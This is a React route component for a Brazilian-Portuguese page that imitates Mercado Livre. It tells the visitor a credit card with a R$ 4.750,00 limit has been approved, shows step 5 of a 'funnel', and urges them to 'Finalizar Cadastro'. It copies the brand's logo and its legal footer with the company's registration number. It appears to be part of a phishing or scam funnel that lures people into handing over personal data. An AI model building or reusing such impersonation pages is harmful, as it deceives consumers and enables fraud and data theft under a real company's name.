import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";

export const Route = createFileRoute("/cartao-aprovado")({
  head: () => ({
    meta: [
      { title: "Parabéns! Cartão aprovado - Mercado Livre" },
      { name: "description", content: "Seu cartão foi aprovado com sucesso. Finalize seu cadastro." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: CartaoAprovado,
});

const infoCards = [
  { icon: "fa-percent", label: "Anuidade", value: "Grátis 1º ano" },
  { icon: "fa-credit-card", label: "Modalidade", value: "Débito e Crédito" },
  { icon: "fa-wifi", label: "Tecnologia", value: "Contactless" },
];

const benefits = [
  { icon: "fa-shield-halved", title: "Máxima Segurança", desc: "Compras protegidas online e físicas com tecnologia avançada" },
  { icon: "fa-mobile-screen", title: "100% Digital", desc: "Processo totalmente online, rápido e sem burocracia" },
  { icon: "fa-chart-line", title: "Controle Total", desc: "App completo para gerenciar seus gastos em tempo real" },
  { icon: "fa-credit-card", title: "Parcelamento Flexível", desc: "Parcele suas compras em até 24x com as melhores condições" },
  { icon: "fa-headset", title: "Suporte 24h", desc: "Atendimento rápido e eficiente via WhatsApp a qualquer hora" },
  { icon: "fa-percent", title: "Anuidade Grátis", desc: "Primeiro ano sem custo algum e condições especiais" },
];

function CartaoAprovado() {
  const navigate = useNavigate();
  const [slide, setSlide] = useState(0);

  useEffect(() => {
    const id = setInterval(() => setSlide((s) => (s + 1) % benefits.length), 3500);
    return () => clearInterval(id);
  }, []);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={5} />

      <main className="flex-1 w-full max-w-md mx-auto px-4 py-6 space-y-5">
        {/* Success */}
        <section className="text-center pt-2">
          <div className="w-20 h-20 rounded-full bg-[#00A650] flex items-center justify-center mx-auto mb-4 shadow-lg shadow-green-200">
            <i className="fas fa-check text-white text-3xl" />
          </div>
          <h1 className="text-3xl font-extrabold text-gray-800">Parabéns!</h1>
          <p className="text-sm text-gray-600 mt-1">Seu cartão foi aprovado com sucesso</p>
        </section>

        {/* Approved card */}
        <section className="bg-white border-2 border-[#00A650] rounded-xl p-6 text-center">
          <div className="text-xs font-bold tracking-widest text-[#00A650]">LIMITE APROVADO</div>
          <div className="text-4xl font-extrabold text-[#00A650] my-3">R$ 4.750,00</div>
          <div className="inline-block bg-[#00A650] text-white text-xs font-semibold px-4 py-2 rounded-full">
            Cartão liberado em até 5 minutos
          </div>
          <div className="text-[11px] text-gray-500 mt-3">Sujeito à confirmação dos dados pessoais</div>
        </section>

        {/* CTA */}
        <button
          onClick={() => navigate({ to: "/aprovado" })}
          className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md shadow-md transition-all"
        >
          Finalizar Cadastro
        </button>

        {/* Info cards */}
        <section className="grid grid-cols-3 gap-2">
          {infoCards.map((c) => (
            <div key={c.label} className="bg-white rounded-xl p-3 text-center">
              <div className="w-10 h-10 mx-auto rounded-lg bg-[#3483FA] flex items-center justify-center mb-2">
                <i className={`fas ${c.icon} text-white text-sm`} />
              </div>
              <div className="text-[10px] tracking-wider text-gray-500 font-semibold">{c.label.toUpperCase()}</div>
              <div className="text-xs font-bold text-gray-800 mt-1">{c.value}</div>
            </div>
          ))}
        </section>

        {/* Benefits carousel */}
        <section className="bg-white rounded-xl p-5">
          <div className="flex items-center justify-center gap-2 mb-4">
            <span className="w-7 h-7 rounded bg-[#FFE600] flex items-center justify-center">
              <i className="fas fa-star text-gray-800 text-xs" />
            </span>
            <span className="font-bold text-gray-800">Benefícios do seu cartão</span>
          </div>

          <div className="bg-gradient-to-br from-[#EAF2FE] to-white rounded-lg p-6 text-center min-h-[170px] flex flex-col items-center justify-center">
            <div className="w-14 h-14 rounded-full bg-[#3483FA] flex items-center justify-center mb-3">
              <i className={`fas ${benefits[slide].icon} text-white text-xl`} />
            </div>
            <div className="text-[#3483FA] font-bold text-lg">{benefits[slide].title}</div>
            <div className="text-sm text-gray-600 mt-1 px-2">{benefits[slide].desc}</div>
          </div>

          <div className="flex justify-center gap-2 mt-4">
            {benefits.map((_, i) => (
              <button
                key={i}
                onClick={() => setSlide(i)}
                aria-label={`Slide ${i + 1}`}
                className={`h-2 rounded-full transition-all ${i === slide ? "w-6 bg-[#3483FA]" : "w-2 bg-gray-300"}`}
              />
            ))}
          </div>
        </section>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
